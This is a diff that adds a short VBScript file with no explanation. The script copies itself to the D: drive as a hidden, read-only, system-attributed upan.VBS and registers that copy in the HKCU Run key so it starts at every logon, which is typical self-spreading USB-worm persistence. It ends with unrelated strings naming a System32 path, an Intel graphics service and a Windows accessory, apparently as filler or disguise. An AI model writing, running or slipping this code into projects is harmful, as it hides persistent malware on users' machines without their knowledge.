@@ -1,0 +1,12 @@
+set fso=createobject("scripting.filesystemobject")
+set ws=createobject("wscript.shell")
+set wshshell=createobject("wscript.shell")
+on error resume next
+fso.copyfile wscript.scriptfullname,"D:\"
+Wshshell.Run "cmd /c Attrib D:\upan.VBS +s +h +a +r"
+set f=fso.getfile("D:\upan.VBS")
+ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"&f.name,f.path
+
+C:\Windows\System32
+igfxCUIService.exe
+Tablet PC Input Panel Accessory
